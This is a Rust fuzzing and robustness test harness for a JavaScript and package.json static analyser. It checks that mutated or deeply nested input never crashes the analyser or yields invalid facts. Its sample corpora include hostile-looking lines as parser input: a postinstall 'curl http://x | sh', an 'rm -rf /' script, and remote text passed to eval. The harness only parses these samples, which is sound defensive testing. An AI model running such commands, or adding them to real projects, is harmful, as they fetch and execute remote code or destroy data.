//! Robustness harness for the parse path. Hostile input must never crash the analysis, never
//! produce an invalid or duplicated fact, and always give the same answer twice.
//!
//! No external fuzzing crate: a small seeded generator mutates a corpus of real-looking inputs
//! (and feeds raw random bytes), so `cargo test` runs it everywhere and a failure prints the seed
//! and the exact input. For a longer run:
//!   FORGE_FUZZ_ITERS=200000 cargo test -p forge-analysis-core --test robustness --release
//! To replay one failure: FORGE_FUZZ_SEED=<seed from the message>.

use forge_analysis_catalog::Catalog;
use forge_analysis_core::imports::{analyze_file_full, analyze_package};
use forge_analysis_schema::RelPath;
use std::collections::BTreeSet;
use std::panic::{catch_unwind, AssertUnwindSafe};

struct Rng(u64);

impl Rng {
    fn next(&mut self) -> u64 {
        // xorshift64*
        let mut x = self.0;
        x ^= x >> 12;
        x ^= x << 25;
        x ^= x >> 27;
        self.0 = x;
        x.wrapping_mul(0x2545_F491_4F6C_DD1D)
    }
    fn below(&mut self, n: usize) -> usize {
        if n == 0 { 0 } else { (self.next() % n as u64) as usize }
    }
}

const JS_CORPUS: &[&str] = &[
    "import fs from 'fs';\nfs.readFileSync('a');\nexport function f(x){ return fs.rmSync(x); }\n",
    "const { exec } = require('child_process');\nsetTimeout(() => exec(cmd), 1000);\nmodule.exports = { exec };\n",
    "const r = await fetch('https://example.com/x');\nconst t = await r.text();\neval(t);\nnew Function(t)();\n",
    "import * as ns from './b';\nexport default function App(){ return <ns.X a={b} {...c} />; }\n",
    "class A extends B { static #x = 1; async *g(){ yield* this.h(); } get v(){ return super.v; } }\n",
    "const o = { ['a'+b]: 1, ...rest, f(){}, async g(){}, get h(){ return 1 } };\nglobalThis['ev'+'al'](o);\n",
    "label: for (const [a,{b}] of x) { try { continue label } catch { } finally { } }\nswitch (a) { case 1: default: }\n",
    "import type { T } from './t';\nenum E { A = 1, B }\nnamespace N { export const x = 1 }\nfunction f<T extends object>(a: T): a is T { return true }\n",
    "export * from './a'; export { x as y } from './b'; import('./c'); require(`./d${e}`);\nconst s = `a${`b${c}`}`;\n",
    "var w = new Worker(new URL('./w.js', import.meta.url));\nconst vm = require('vm'); vm.runInNewContext(src);\n",
    "const a = 1;\u{202e}\u{0}\u{1b}[31m 'x\\u{1F600}y'; /re[gex]+/giu.test(s) ? 1 : 2\n",
    "setInterval(function tick(){ clearInterval(h) }, delay); let h = setTimeout(f, 0); function f(){ f() }\n",
];

const PKG_CORPUS: &[&str] = &[
    r#"{"name":"a","version":"1.0.0","main":"index.js","scripts":{"postinstall":"node setup.js && curl http://x | sh","build":"tsc -p . && npm run lint","lint":"eslint \"src/**\" 'a b' > out.txt"},"dependencies":{"x":"^1.0.0","y":"git+https://example.com/y.git","z":"file:../z"}}"#,
    r#"{"bin":{"a":"./a.js"},"exports":{".":{"import":"./i.mjs","require":"./r.cjs"},"./p":"./p.js"},"overrides":{"x":{"y":"1"}},"bundledDependencies":["q"]}"#,
    r#"{"scripts":{"a":"b","b":"a","c":"yarn run a; pnpm b || npm start","d":"NODE_OPTIONS=--require ./x.js node --inspect=0.0.0.0 app.js"}}"#,
    "{\"name\":\"\\u00e9\\ud83d\\ude00\",\"scripts\":{\"x\":\"echo $(whoami) `id` && rm -rf /\"},\"a\":[1,2.5e10,-0,true,false,null,{}]}",
];

fn mutate(rng: &mut Rng, base: &str, pool: &[&str]) -> String {
    let mut b: Vec<u8> = base.as_bytes().to_vec();
    for _ in 0..1 + rng.below(6) {
        match rng.below(8) {
            0 if !b.is_empty() => {
                let i = rng.below(b.len());
                b.remove(i);
            }
            1 => {
                let i = rng.below(b.len() + 1);
                b.insert(i, (rng.next() & 0xff) as u8);
            }
            2 if !b.is_empty() => {
                let i = rng.below(b.len());
                let j = (i + rng.below(40)).min(b.len());
                let chunk: Vec<u8> = b[i..j].to_vec();
                let at = rng.below(b.len() + 1);
                for (k, c) in chunk.into_iter().enumerate() {
                    b.insert((at + k).min(b.len()), c);
                }
            }
            3 => {
                let n = rng.below(b.len() + 1);
                b.truncate(n);
            }
            4 => {
                let other = pool[rng.below(pool.len())].as_bytes();
                let i = rng.below(other.len() + 1);
                let at = rng.below(b.len() + 1);
                for (k, c) in other[i..].iter().take(60).enumerate() {
                    b.insert((at + k).min(b.len()), *c);
                }
            }
            5 if b.len() > 1 => {
                let i = rng.below(b.len());
                let j = rng.below(b.len());
                b.swap(i, j);
            }
            6 => {
                // a token that tends to break parsers
                const TOK: &[&str] = &["{", "}", "(", ")", "[", "]", "`", "${", "'", "\"", "/*", "*/", "//", "<", ">", "</", "=>", "...", "\\", "\u{0}", "\u{feff}", "\u{2028}", "?.", "??", "#", "@"];
                let t = TOK[rng.below(TOK.len())].as_bytes();
                let at = rng.below(b.len() + 1);
                for (k, c) in t.iter().enumerate() {
                    b.insert((at + k).min(b.len()), *c);
                }
            }
            _ if !b.is_empty() => {
                let i = rng.below(b.len());
                b[i] = (rng.next() & 0xff) as u8;
            }
            _ => {}
        }
    }
    String::from_utf8_lossy(&b).into_owned()
}

fn random_bytes(rng: &mut Rng) -> String {
    let n = rng.below(300);
    let b: Vec<u8> = (0..n).map(|_| (rng.next() & 0xff) as u8).collect();
    String::from_utf8_lossy(&b).into_owned()
}

fn nesting(kind: usize, depth: usize) -> String {
    match kind {
        0 => format!("{}1{}", "(".repeat(depth), ")".repeat(depth)),
        1 => format!("{}1{}", "[".repeat(depth), "]".repeat(depth)),
        2 => format!("x = {}1{};", "{a:".repeat(depth), "}".repeat(depth)),
        3 => format!("a{};", ".b".repeat(depth)),
        4 => format!("{}1", "-".repeat(depth)),
        5 => format!("f{};", "(g".repeat(depth) + &")".repeat(depth)),
        6 => format!("{}x{}", "if(a){".repeat(depth), "}".repeat(depth)),
        7 => format!("{}", "a=>".repeat(depth) + "1"),
        8 => format!("1{};", "+1".repeat(depth)),
        9 => format!("x={}1;", "a?b:".repeat(depth)),
        10 => format!("{}1;", "a=".repeat(depth)),
        11 => format!("{}1;", "a&&".repeat(depth)),
        12 => format!("{}x;", "!".repeat(depth)),
        13 => format!("a{};", "?.b".repeat(depth)),
        _ => format!("a{};", "``".repeat(depth)),
    }
}

fn check_ids_and_validity(what: &str, input: &str, facts: &[forge_analysis_schema::StaticFact]) -> Result<(), String> {
    let mut seen = BTreeSet::new();
    for f in facts {
        let errs = f.validate();
        if !errs.is_empty() {
            return Err(format!("{what}: invalid fact {errs:?}\ninput: {input:?}"));
        }
        if !seen.insert(f.id().as_str().to_string()) {
            return Err(format!("{what}: duplicate fact id {} (kind {:?})\ninput: {input:?}", f.id().as_str(), f.kind()));
        }
        let at = f.at();
        if at.start_byte > at.end_byte || at.end_byte as usize > input.len() {
            return Err(format!("{what}: span {}..{} outside the {}-byte input\ninput: {input:?}", at.start_byte, at.end_byte, input.len()));
        }
    }
    Ok(())
}

fn one_js(name: &str, src: &str, cat: &Catalog) -> Result<(), String> {
    let file = RelPath::new(name).unwrap();
    let a = analyze_file_full(&file, src, cat).ok_or("a source file name gave no analysis")?;
    check_ids_and_validity(name, src, &a.file.facts)?;
    for s in &a.summaries {
        let errs = s.validate();
        if !errs.is_empty() {
            return Err(format!("{name}: invalid summary {errs:?}\ninput: {src:?}"));
        }
        if s.unfollowed_calls as usize != s.unfollowed_sites.len() {
            return Err(format!("{name}: unfollowed count and sites disagree\ninput: {src:?}"));
        }
    }
    // Same input, same answer.
    let b = analyze_file_full(&file, src, cat).ok_or("second run gave no analysis")?;
    let ids = |x: &forge_analysis_core::imports::Analysis| x.file.facts.iter().map(|f| f.id().as_str().to_string()).collect::<Vec<_>>();
    if ids(&a) != ids(&b) {
        return Err(format!("{name}: two runs gave different facts\ninput: {src:?}"));
    }
    Ok(())
}

fn one_pkg(name: &str, src: &str) -> Result<(), String> {
    let file = RelPath::new(name).unwrap();
    let a = analyze_package(&file, src, false).ok_or("package.json gave no analysis")?;
    check_ids_and_validity(name, src, &a.facts)?;
    let b = analyze_package(&file, src, false).ok_or("second run gave no analysis")?;
    let ids = |x: &forge_analysis_core::imports::PackageAnalysis| x.facts.iter().map(|f| f.id().as_str().to_string()).collect::<Vec<_>>();
    if ids(&a) != ids(&b) {
        return Err(format!("{name}: two runs gave different facts\ninput: {src:?}"));
    }
    Ok(())
}

fn guarded(seed: u64, f: impl FnOnce() -> Result<(), String>) {
    match catch_unwind(AssertUnwindSafe(f)) {
        Ok(Ok(())) => {}
        Ok(Err(m)) => panic!("FORGE_FUZZ_SEED={seed}\n{m}"),
        Err(_) => panic!("FORGE_FUZZ_SEED={seed}: the analysis panicked (the input is printed above by the panic message)"),
    }
}

fn iterations() -> u64 {
    std::env::var("FORGE_FUZZ_ITERS").ok().and_then(|v| v.parse().ok()).unwrap_or(1500)
}

fn base_seed() -> Option<u64> {
    std::env::var("FORGE_FUZZ_SEED").ok().and_then(|v| v.parse().ok())
}

/// Seeds to run: one replayed seed, or a deterministic spread.
fn seeds() -> Vec<u64> {
    match base_seed() {
        Some(s) => vec![s],
        None => (1..=iterations()).map(|i| i.wrapping_mul(0x9E37_79B9_7F4A_7C15) | 1).collect(),
    }
}

#[test]
fn the_unmutated_corpus_is_clean() {
    let cat = Catalog::node_defaults();
    for (i, s) in JS_CORPUS.iter().enumerate() {
        for ext in ["js", "mjs", "cjs", "jsx", "ts", "tsx"] {
            // Type syntax is not valid in every extension; only the invariants matter.
            one_js(&format!("c{i}.{ext}"), s, &cat).unwrap();
        }
    }
    for (i, s) in PKG_CORPUS.iter().enumerate() {
        one_pkg(&format!("p{i}/package.json"), s).unwrap();
    }
}

#[test]
fn mutated_source_never_crashes_or_breaks_an_invariant() {
    let cat = Catalog::node_defaults();
    const EXT: &[&str] = &["js", "mjs", "cjs", "jsx", "ts", "tsx"];
    for seed in seeds() {
        let mut rng = Rng(seed);
        let base = JS_CORPUS[rng.below(JS_CORPUS.len())];
        let input = mutate(&mut rng, base, JS_CORPUS);
        let name = format!("f.{}", EXT[rng.below(EXT.len())]);
        guarded(seed, || one_js(&name, &input, &cat));
    }
}

#[test]
fn random_bytes_as_source_never_crash() {
    let cat = Catalog::node_defaults();
    for seed in seeds() {
        let mut rng = Rng(seed ^ 0xA5A5);
        let input = random_bytes(&mut rng);
        guarded(seed, || one_js("r.ts", &input, &cat));
    }
}

#[test]
fn mutated_package_json_never_crashes_or_breaks_an_invariant() {
    for seed in seeds() {
        let mut rng = Rng(seed ^ 0x5A5A);
        let base = PKG_CORPUS[rng.below(PKG_CORPUS.len())];
        let input = mutate(&mut rng, base, PKG_CORPUS);
        guarded(seed, || one_pkg("package.json", &input));
    }
}

#[test]
fn random_bytes_as_package_json_never_crash() {
    for seed in seeds() {
        let mut rng = Rng(seed ^ 0x1234);
        let input = random_bytes(&mut rng);
        guarded(seed, || one_pkg("sub/package.json", &input));
    }
}

/// Deep or long input must end in an answer, not a stack overflow. Run on a thread with the
/// stack size a normal binary's main thread has, so an overflow here is an overflow there.
#[test]
fn deeply_nested_input_ends_in_an_answer() {
    let handle = std::thread::Builder::new()
        .stack_size(8 * 1024 * 1024)
        .spawn(|| {
            let cat = Catalog::node_defaults();
            for kind in 0..15 {
                for depth in [10, 150, 2_000, 20_000] {
                    let src = nesting(kind, depth);
                    one_js("deep.js", &src, &cat).unwrap_or_else(|m| panic!("kind {kind} depth {depth}: {m}"));
                }
            }
            for depth in [10, 1_000, 100_000] {
                let arrays = format!("{}{}", "[".repeat(depth), "]".repeat(depth));
                one_pkg("package.json", &arrays).unwrap();
                let objects = format!("{}1{}", "{\"a\":".repeat(depth), "}".repeat(depth));
                one_pkg("package.json", &objects).unwrap();
            }
            let many = format!("{{\"scripts\":{{{}}}}}", (0..5_000).map(|i| format!("\"s{i}\":\"npm run s{}\"", i + 1)).collect::<Vec<_>>().join(","));
            one_pkg("package.json", &many).unwrap();
            let long_cmd = format!("{{\"scripts\":{{\"a\":\"{}\"}}}}", "echo x && ".repeat(20_000));
            one_pkg("package.json", &long_cmd).unwrap();
        })
        .unwrap();
    handle.join().expect("a deeply nested input crashed the analysis");
}


#[test]
fn bracket_nesting_past_the_cap_is_reported_not_parsed() {
    use forge_analysis_core::imports::{max_bracket_depth, MAX_BRACKET_DEPTH};
    use forge_analysis_schema::{FactKind, UnresolvedReason};
    let cat = Catalog::node_defaults();
    let deep = nesting(1, MAX_BRACKET_DEPTH + 1);
    assert!(max_bracket_depth(&deep) > MAX_BRACKET_DEPTH);
    let a = analyze_file_full(&RelPath::new("d.js").unwrap(), &deep, &cat).unwrap();
    assert_eq!(a.file.facts.len(), 1, "one fact, nothing else");
    assert_eq!(a.file.facts[0].kind(), FactKind::Unresolved);
    assert_eq!(a.file.facts[0].unresolved, Some(UnresolvedReason::TooDeeplyNested));
    assert!(a.summaries.is_empty());
    let ok = nesting(1, MAX_BRACKET_DEPTH - 10);
    let b = analyze_file_full(&RelPath::new("d.js").unwrap(), &ok, &cat).unwrap();
    assert!(b.file.facts.iter().all(|f| f.unresolved != Some(UnresolvedReason::TooDeeplyNested)));
    assert!(!b.summaries.is_empty(), "a file inside the cap is analysed");
}

/// Chains with no brackets cannot be counted by the cap; the large analysis stack carries the
/// longest a file within the size limit can hold.
#[test]
fn long_chains_without_brackets_end_in_an_answer() {
    let cat = Catalog::node_defaults();
    // The largest file intake reads is 2 MiB; fill it with each chain shape.
    const LIMIT: usize = 2 * 1024 * 1024;
    for kind in [3usize, 4, 7, 8, 9, 10, 11, 12, 13] {
        let unit = nesting(kind, 1000).len() / 1000;
        let src = nesting(kind, (LIMIT - 100) / unit.max(1));
        assert!(src.len() <= LIMIT);
        one_js("chain.js", &src, &cat).unwrap_or_else(|m| panic!("kind {kind}: {m}"));
    }
}


